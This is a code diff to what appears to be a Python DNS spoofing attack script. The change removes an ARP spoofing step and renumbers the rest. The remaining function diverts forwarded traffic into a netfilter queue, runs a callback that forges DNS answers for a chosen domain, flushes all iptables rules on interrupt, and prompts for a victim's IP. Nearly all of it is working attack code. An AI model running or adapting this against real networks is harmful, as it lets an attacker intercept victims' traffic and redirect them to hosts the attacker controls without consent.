@@ -1,7 +1,6 @@
 import os
 
 from functions import *
-from arp_spoofing import arp_spoofing
 from functools import partial
 from netfilterqueue import NetfilterQueue
 
@@ -9,33 +8,29 @@ def dns_spoofing(victim_ip, domain, host, output = False):
     """
     Performs the DNS spoofing attack
     
-    Step 1: Starting ARP spoofing
-    Step 2: Insert FORWARD rule in iptables
-    Step 3: Start Netfilter queue
-    Step 4: Bind the queue to our "process" callback
-    Step 5: Run the queue
-    Step 6: Removing FORWARD rule from iptables
+    Step 1: Insert FORWARD rule in iptables
+    Step 2: Start Netfilter queue
+    Step 3: Bind the queue to our "process" callback
+    Step 4: Run the queue
+    Step 5: Removing FORWARD rule from iptables
     """
-
-    # Step 1
-    arp_spoofing(victim_ip, output)
 
     QUEUE_NUM = 0
     
-    # Step 2
+    # Step 1
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
     
-    # Step 3
+    # Step 2
     queue = NetfilterQueue()
 
     try:
-        # Step 4
+        # Step 3
         queue.bind(QUEUE_NUM, partial(process_packet, domain, host, output))
         
-        # Step 5
+        # Step 4
         queue.run()
     except KeyboardInterrupt:
-        # Step 6
+        # Step 5
         os.system("iptables --flush")
 
 victim_ip = input("Enter victim's IP address: ")
